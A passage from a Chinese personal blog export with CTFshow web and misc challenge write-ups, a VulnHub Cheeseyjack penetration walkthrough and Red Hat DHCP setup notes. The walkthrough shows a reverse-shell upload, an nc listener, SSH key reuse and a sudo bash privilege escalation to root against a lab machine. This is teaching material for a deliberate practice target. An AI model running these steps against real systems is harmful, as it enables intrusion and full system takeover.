<h2 id="信息搜集-Web17"><a href="#信息搜集-Web17" class="headerlink" title="信息搜集 Web17"></a>信息搜集 Web17</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：CDN穿透</span><br></pre></td></tr></table></figure>
<p>ping一下就行了<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/17.1.png"><br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/17.2.png"></p>
<h2 id="信息搜集-Web18"><a href="#信息搜集-Web18" class="headerlink" title="信息搜集 Web18"></a>信息搜集 Web18</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：js敏感信息泄露</span><br></pre></td></tr></table></figure>
<blockquote>
<p>JavaScript是一门前端的脚本语言，在页面源代码中可以随意浏览<br>将信息隐藏在js中(又不处理的话)，通过审计很容易就可以得到隐藏信息<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/18.1.png"><br>访问110.php即可得到flag<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/18.2.png"></p>
</blockquote>
<h2 id="信息搜集-Web19"><a href="#信息搜集-Web19" class="headerlink" title="信息搜集 Web19"></a>信息搜集 Web19</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：前段密钥泄露</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/19.1.png"><br>F12 检查代码<br>这里把源码贴一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    error_reporting(0);</span><br><span class="line">    $flag=&quot;fakeflag&quot;</span><br><span class="line">    $u = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $p = $_POST[&#x27;pazzword&#x27;];</span><br><span class="line">    if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="line">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很简单，post传参就可以了<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/19.2.jpg"><br>记得安装炒鸡好用的插件Hackbar!!</p>
<h2 id="信息搜集-Web20"><a href="#信息搜集-Web20" class="headerlink" title="信息搜集 Web20"></a>信息搜集 Web20</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：数据库恶意下载</span><br></pre></td></tr></table></figure>
<blockquote>
<p>mdb文件是早期asp+access构架的数据库文件<br>直接查看url路径添加/db/db.mdb  下载文件后搜索flag即可得到想要的结果<br><img src="/2021/03/07/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%861-20/20.1.png"><br>web入门-信息搜集篇到这里就结束啦<br>上课摸鱼真爽，以后接着干（）<br>最后，完结撒花∠∠❀</p>
</blockquote>
<hr>
<blockquote>
<p>自能生羽翼，何必仰云梯</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>CTFshow刷题合集</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow 萌新区杂项1-11</title>
    <url>/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/</url>
    <content><![CDATA[<p>CTFshow刷题合集之萌新杂项~</p>
<h2 id="萌新区-杂项1"><a href="#萌新区-杂项1" class="headerlink" title="萌新区 杂项1"></a>萌新区 杂项1</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.1.png"></p>
<span id="more"></span>
<p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/1.2.png"><br>hint直接给答案可还行</p>
<h2 id="萌新区-杂项2"><a href="#萌新区-杂项2" class="headerlink" title="萌新区 杂项2"></a>萌新区 杂项2</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/2.2.png"><br>没啥好讲的 记事本看也行</p>
<h2 id="萌新区-杂项3"><a href="#萌新区-杂项3" class="headerlink" title="萌新区 杂项3"></a>萌新区 杂项3</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/3.1.png"><br>信息就那么几个：97 10 01 15<br>银行卡密码6位数 试几次就行了<br>密码为 971015</p>
<h2 id="萌新区-杂项4"><a href="#萌新区-杂项4" class="headerlink" title="萌新区 杂项4"></a>萌新区 杂项4</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/4.1.png"><br>给的信息够多了 直接生成个字典暴力破解就行</p>
<h2 id="萌新区-杂项5"><a href="#萌新区-杂项5" class="headerlink" title="萌新区 杂项5"></a>萌新区 杂项5</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.1.png"><br>乍一看没什么头脑（这种情况也就刚拿到题目一分钟左右）<br>很快就可以发现大写分布是不规律的 尤其是country的o是个0（数字）<br>我们把大写的字母一个一个挑出来 就会发现是答案<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/5.2.png"><br>flag{ctfshownb} 没什么难度，抖机灵的题</p>
<h2 id="萌新区-杂项6"><a href="#萌新区-杂项6" class="headerlink" title="萌新区 杂项6"></a>萌新区 杂项6</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.1.png"><br>很明了，考察的是伪加密<br>先查找50 4B 01 02<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.2.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.3.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.4.png"><br>改过之后即可解压成功<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/6.5.png"><br>PS:50 4B 03 04：这是头文件标记（0x04034b50）</p>
<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密</p>
<p>伪加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
<h2 id="萌新区-杂项7"><a href="#萌新区-杂项7" class="headerlink" title="萌新区 杂项7"></a>萌新区 杂项7</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.1.png"><br>感觉是改宽高的题<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.2.png"><br>确实是改宽高的题   我觉得这种题过不了正规比赛的审（单纯指图片）<br>找到图片的src，然后进行爆破  src跟在宽高后面<br>怎么知道宽高在哪儿？一个很朴素的办法就是先看图片的属性 然后转十六进制 就酱<br>你不得不承认这是种办法  只不过听了有种想打我的冲突而已23333<br>最最原始且朴素的找宽高的办法哈哈哈哈<br>反正正常做法都清楚 我就不写了<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/7.3.png"><br>然后改一下就行了  细节不展示了<br>最后，贴一下爆破宽高的脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()</span><br><span class="line">k=0</span><br><span class="line">for i in range(5000):</span><br><span class="line">    if k==1:</span><br><span class="line">        break</span><br><span class="line">    for j in range(5000):</span><br><span class="line">        c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29]</span><br><span class="line">        crc = binascii.crc32(c) &amp; 0xffffffff</span><br><span class="line">        if crc == 0x889c2f07:</span><br><span class="line">            k = 1</span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h2 id="萌新区-杂项8"><a href="#萌新区-杂项8" class="headerlink" title="萌新区 杂项8"></a>萌新区 杂项8</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.1.png"><br>是这样的，题做出来了 跟杂项7是一样的<br>但是我懒得写笔记了 所以这里应付一下（）<br>就跟杂项7的做法一样，上脚本爆破<br>只需要改一下crc就行了 灰常简单~<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/8.2.png"></p>
<h2 id="萌新区-杂项9"><a href="#萌新区-杂项9" class="headerlink" title="萌新区 杂项9"></a>萌新区 杂项9</h2><p>爷不会</p>
<h2 id="萌新区-杂项10"><a href="#萌新区-杂项10" class="headerlink" title="萌新区 杂项10"></a>萌新区 杂项10</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/10.2.png"><br>看不出来所以然 看了眼题目摘了眼镜 有点懵逼<br>猜了一下好像是我好喜欢你<br>做题方法：缩小图片并摘下眼镜  (#^.^#)眼快瞎了嗷</p>
<h2 id="萌新区-杂项11"><a href="#萌新区-杂项11" class="headerlink" title="萌新区 杂项11"></a>萌新区 杂项11</h2><p><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.1.png"><br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.2.png"><br>上传文件之后点seek 密码为空直接点OK打开后发现是一个二维码<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.3.png"><br>是这样的，我扫了一下，然后出来了大吉大利杯的宣传视频，然后末尾还有个这么个东西……<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.4.png"><br>我……  好吧  我先去找一圈wp<br>大佬用的是QR_Research<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.5.png"><br>接下来来base64解码即可<br><img src="/2021/01/12/CTFshow-%E8%90%8C%E6%96%B0%E5%8C%BA%E6%9D%82%E9%A1%B91-11/11.6.png"><br>又是被flag笑到的一天</p>
<hr>
<blockquote>
<p>只要心还透明，就能折射希望。</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>CTFshow刷题合集</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-Misc入门-图片篇</title>
    <url>/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/</url>
    <content><![CDATA[<p>什么？又出新题了<br>还有一堆web没做，你怎么跑到Misc来摸鱼了？(大雾)<br>这个系列学累了偶尔来做一做，更新随缘~</p>
<h2 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h2><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h3><p>解压完直接打开即可<br>不会有人傻到一个一个对着打flag吧？不会吧不会吧？<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.png"></p>
<span id="more"></span>
<p><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.1.png"></p>
<h3 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h3><p>打开txt发现是一堆乱码<br>看到文件头的字样推断是png图像<br>修改后缀格式即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.png"><br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.1.png"></p>
<h3 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc 3"></a>Misc 3</h3><p>用bgp查看软件打开即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/3.png"></p>
<h3 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc 4"></a>Misc 4</h3><p>一张一张的看<br>这种题什么也不考察 纯粹耍猴<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/4.png"></p>
<h2 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h2><h3 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc 5"></a>Misc 5</h3><p>010 editor打开搜索ctf字样即可发现最后几行有flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/5.png"></p>
<h3 id="Misc-6"><a href="#Misc-6" class="headerlink" title="Misc 6"></a>Misc 6</h3><p>没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/6.png"></p>
<h3 id="Misc-7"><a href="#Misc-7" class="headerlink" title="Misc 7"></a>Misc 7</h3><p>也没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/7.png"></p>
<h3 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h3><p>里面还藏着一个图片<br>binwalk或者手动提取图片即可<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/8.png"></p>
<h3 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h3><p>还是没什么好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/9.png"></p>
<h3 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h3><p>binwalk一把梭<br>打开其中一个文件可以发现flag</p>
<hr>
<blockquote>
<p>生活不是选择，而是热爱。或许你我终将落俗，但浪漫至死不渝。</p>
</blockquote>
<hr>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机Cheesey:Cheeseyjack渗透记录</title>
    <url>/2021/07/22/Cheesey-Cheeseyjack/</url>
    <content><![CDATA[<p>本来懒得写，但是写完搜了一下发现这个靶机的笔记比较少，就发出来供大家参考。<br>本人巨菜，轻喷。</p>
<hr>
<blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/">https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/</a></p>
</blockquote>
<hr>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Cheesey: Cheeseyjack×1<br>渗透机kali 2021.2×1 和靶机在同一网段</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机，看一下mac地址。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/1.png"><br>扫描内网，根据mac地址判断渗透靶机的ip。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/22/Cheesey-Cheeseyjack/2.png"><br>nmap信息探测。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.134</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/22/Cheesey-Cheeseyjack/3.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/4.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/5.png"></p>
<span id="more"></span>
<p>开了不少端口，先记着。web服务开着，先去瞅一眼<br><img src="/2021/07/22/Cheesey-Cheeseyjack/6.png"><br>随便点点，这个网页上还有一些信息，也要收集起来。<br>接下来试着用gobuster扫一下看看（基于go语言的扫描器，高速好用！）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/22/Cheesey-Cheeseyjack/7.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/8.png"><br>扫到的地址去访问看一下<br>是后台登录界面<br><img src="/2021/07/22/Cheesey-Cheeseyjack/9.png"><br>这个目录藏着一个文档<br><img src="/2021/07/22/Cheesey-Cheeseyjack/10.png"><br>打开看一下<br><img src="/2021/07/22/Cheesey-Cheeseyjack/11.png"><br>吐槽密码设置的太简单了，应该就是弱口令。先把这个信息收集起来。<br>扫一下这个后台登录界面，看看有什么东西。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/project_management -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/22/Cheesey-Cheeseyjack/12.png"><br>访问一下。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/13.png"><br>在databases.yml发现了点信息。不管有用没有，收集起来再说。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/14.png"><br>试着用enum4linux看看能不能收集到啥【enum4linux是Kali Linux自带的一款信息收集工具】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.55.134</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#x63;&#104;&#x33;&#x33;&#115;&#51;&#x6d;&#52;&#x6e;&#x40;&#x63;&#x68;&#101;&#x65;&#x73;&#x65;&#x79;&#x6a;&#97;&#x63;&#x6b;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#x6c;">&#x63;&#104;&#x33;&#x33;&#115;&#51;&#x6d;&#52;&#x6e;&#x40;&#x63;&#x68;&#101;&#x65;&#x73;&#x65;&#x79;&#x6a;&#97;&#x63;&#x6b;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#x6c;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1111</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/22/Cheesey-Cheeseyjack/20.png"><br>刚才收集到了uploads文件夹，找到shell.php点击即可。<br>![](21 (2).png)<br><img src="/2021/07/22/Cheesey-Cheeseyjack/21.png"><br>因为自带有python3环境【可以用which python找路径】<br>所以这里还可以打一个反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
<p>发现有两个用户，于是去crab那里看一下<br><img src="/2021/07/22/Cheesey-Cheeseyjack/22.png"><br>发现了一个todo.txt 打开获得了一点小提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Scold cheese for weak qdpm password (done)</span><br><span class="line">2. Backup SSH keys to /var/backups</span><br><span class="line">3. Change cheese&#x27;s weak password</span><br><span class="line">4. Milk</span><br><span class="line">5. Eggs</span><br><span class="line">6. Stop putting my grocery list on my todo lists</span><br></pre></td></tr></table></figure>
<p>直接枚举/var/backups的所有内容，发现里面有一个ssh的备份<br><img src="/2021/07/22/Cheesey-Cheeseyjack/23.png"><br>复制粘贴，然后放到文本里<br><img src="/2021/07/22/Cheesey-Cheeseyjack/24.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/25.png"><br>另开一个终端，修改权限，注意必须是600！<br>修改权限后，链接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i sshkey crab@192.168.55.134</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/22/Cheesey-Cheeseyjack/26.png"><br>很明显接下来要提权了，直接<code>sudo -l</code><br><img src="/2021/07/22/Cheesey-Cheeseyjack/27.png"><br>可以发现/home/crab/.bin/就是突破点。crab可以用sudo在这个目录运行所有的内容<br><img src="/2021/07/22/Cheesey-Cheeseyjack/28.png"><br>确定目标后提权就简单了，把bash shell复制到这个目录下，以sudo临时运行 bash，就可以获得root权限了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /home/crab/.bin/bash</span><br><span class="line">sudo /home/crab/.bin/bash -p</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/22/Cheesey-Cheeseyjack/29.png"><br>导航到根目录,发现有个root.txt。打开即可获得flag<br><img src="/2021/07/22/Cheesey-Cheeseyjack/30.png"><br>至此，渗透结束。</p>
<hr>
<blockquote>
<p>今天再大的事，到了明天就是小事；今年再大的事，到了明年就是故事。</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>RedHat7 DHCP服务器配置</title>
    <url>/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<p>社团作业 没有难度</p>
<blockquote>
<p>DHCP（动态主机配置协议）是一个局域网的网络协议。指的是由服务器控制一段IP地址范围，客户机登录服务器时就可以自动获得服务器分配的IP地址和子网掩码。担任DHCP服务器的计算机需要安装TCP/IP协议，并为其设置静态IP地址、子网掩码、默认网关等内容。</p>
</blockquote>
<span id="more"></span>
<h2 id="创建挂载点"><a href="#创建挂载点" class="headerlink" title="创建挂载点"></a>创建挂载点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/cdrom</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png"></p>
<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/dev.repo</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dvd]</span><br><span class="line">name = dvd</span><br><span class="line">baseurl = file:///mnt/cdrom</span><br><span class="line">gpgcheck = 0</span><br><span class="line">enabled = 1</span><br></pre></td></tr></table></figure>

<h2 id="配置IP"><a href="#配置IP" class="headerlink" title="配置IP"></a>配置IP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/3.png"></p>
<h2 id="关闭selinux和防火墙"><a href="#关闭selinux和防火墙" class="headerlink" title="关闭selinux和防火墙"></a>关闭selinux和防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">getenforce</span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/4.png"></p>
<blockquote>
<p>DHCP工作流程：<br>1 客户端发送广播向服务器申请IP地址<br>2 服务器收到请求后查看主配置文件dhcpd.conf，先根据客户端的mac地址查看是否为客户端设置了固定的IP地址<br>3 如果为客户端设置了固定的IP地址，则将该IP地址发送给客户端。如果没有设置固定IP地址，则将地址池中的IP地址发送给客户端。<br>4 客户端收到服务器回应后，客户端给与服务器回应，告诉已经使用了分配的IP地址。<br>5 服务器将相关租约信息存入数据库</p>
</blockquote>
<h2 id="安装DHCP"><a href="#安装DHCP" class="headerlink" title="安装DHCP"></a>安装DHCP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install dhcp</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/5.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/dhcp/dhcpd.conf</span><br></pre></td></tr></table></figure>
<h2 id="修改dhcpd-conf-主配置文件"><a href="#修改dhcpd-conf-主配置文件" class="headerlink" title="修改dhcpd.conf 主配置文件"></a>修改dhcpd.conf 主配置文件</h2><p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/6.png"><br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/7.png"><br>将另一台虚拟机配置为DHCP自动获取IP<br>关闭VMware软件自带的DHCP功能<br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/8.jpg"></p>
<h2 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart dhcpd</span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/9.png"></p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>打开另一台虚拟机（Linux/windows），网卡改成vmnet8，把IP地址调成自动获取（dhcp），然后重启网络服务器。然后IP就应该自动获取了。<br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/10.jpg"><br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/11.png"><br>这样就算完成了</p>
<hr>
<blockquote>
<p>对深海的恐惧，对深海的向往，人类源自海洋，我们回不去的故乡。​</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>Linux学习记录</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Red Hat 7配置samba服务器</title>
    <url>/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<p>是Linux学习，也是社团作业。<br>因为要求到点交，就认真的写了一下。<br>挺简单的，完全没啥需要注意的<br>学长给的步骤好多，有的感觉没必要，但还是照着操作了</p>
<blockquote>
